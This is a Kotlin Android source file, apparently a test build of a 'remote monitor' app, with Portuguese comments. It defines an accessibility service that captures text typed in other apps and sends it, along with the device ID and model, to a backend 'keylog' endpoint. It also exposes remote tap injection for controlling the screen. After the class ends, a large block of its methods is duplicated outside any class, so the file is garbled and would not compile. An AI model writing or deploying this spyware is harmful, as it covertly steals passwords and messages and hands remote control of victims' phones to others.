package com.remotemonitor.test

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class RemoteControlAccessibilityService : AccessibilityService() {

    private var currentAppName: String = "Desconhecido"

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val pkgName = event.packageName?.toString() ?: return
                // Ignora o próprio app
                if (pkgName == packageName) return
                currentAppName = pkgName
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text?.joinToString("") ?: return
                if (text.isBlank()) return
                val appName = currentAppName
                Thread {
                    sendKeylog(appName = appName, keyText = text)
                }.start()
            }
        }
    }

    override fun onInterrupt() {
        // No-op
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.i(TAG, "Servico de acessibilidade conectado")
    }

    override fun onDestroy() {
        instance = null
        super.onDestroy()
    }

    private fun sendKeylog(appName: String, keyText: String) {
        try {
            val androidId = android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"
            val endpoint = "${BuildConfig.BACKEND_BASE_URL}/api/device/keylog"
            val connection = URL(endpoint).openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.connectTimeout = 8_000
            connection.readTimeout = 8_000
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/json")

            val payload = JSONObject().apply {
                put("packageName", BuildConfig.APPLICATION_ID)
                put("deviceUid", androidId)
                put("deviceName", Build.MODEL ?: "Android Device")
                put("model", Build.MODEL ?: "Android")
                put("appName", appName)
                put("keyText", keyText)
            }

            OutputStreamWriter(connection.outputStream, Charsets.UTF_8).use { it.write(payload.toString()) }

            val status = connection.responseCode
            if (status !in 200..299) {
                Log.w(TAG, "Keylog upload retornou HTTP $status")
            }
        } catch (error: Exception) {
            Log.w(TAG, "Falha ao enviar keylog", error)
        }
    }

    private fun performTapPercent(xPercent: Double, yPercent: Double): Boolean {
        val bounds = getScreenBounds()
        val x = bounds.left + (bounds.width() * (xPercent / 100.0)).toFloat()
        val y = bounds.top + (bounds.height() * (yPercent / 100.0)).toFloat()

        val path = Path().apply { moveTo(x, y) }
        val stroke = GestureDescription.StrokeDescription(path, 0, 80)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()

        return dispatchGesture(gesture, null, null)
    }

    private fun getScreenBounds(): Rect {
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return wm.currentWindowMetrics.bounds
        }

        @Suppress("DEPRECATION")
        val display = wm.defaultDisplay
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        display.getRealMetrics(metrics)
        return Rect(0, 0, metrics.widthPixels, metrics.heightPixels)
    }

    companion object {
        private const val TAG = "RemoteControlA11y"

        @Volatile
        private var instance: RemoteControlAccessibilityService? = null

        fun dispatchTapPercent(xPercent: Double, yPercent: Double): Boolean {
            val service = instance ?: return false
            return try {
                service.performTapPercent(xPercent, yPercent)
            } catch (error: Exception) {
                Log.w(TAG, "Falha ao executar toque remoto", error)
                false
            }
        }
    }
}


    private fun performTapPercent(xPercent: Double, yPercent: Double): Boolean {
        val bounds = getScreenBounds()
        val x = bounds.left + (bounds.width() * (xPercent / 100.0)).toFloat()
        val y = bounds.top + (bounds.height() * (yPercent / 100.0)).toFloat()

        val path = Path().apply { moveTo(x, y) }
        val stroke = GestureDescription.StrokeDescription(path, 0, 80)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()

        return dispatchGesture(gesture, null, null)
    }

    private fun getScreenBounds(): Rect {
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return wm.currentWindowMetrics.bounds
        }

        @Suppress("DEPRECATION")
        val display = wm.defaultDisplay
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        display.getRealMetrics(metrics)
        return Rect(0, 0, metrics.widthPixels, metrics.heightPixels)
    }

    companion object {
        private const val TAG = "RemoteControlA11y"

        @Volatile
        private var instance: RemoteControlAccessibilityService? = null

        fun dispatchTapPercent(xPercent: Double, yPercent: Double): Boolean {
            val service = instance ?: return false
            return try {
                service.performTapPercent(xPercent, yPercent)
            } catch (error: Exception) {
                Log.w(TAG, "Falha ao executar toque remoto", error)
                false
            }
        }
    }
}
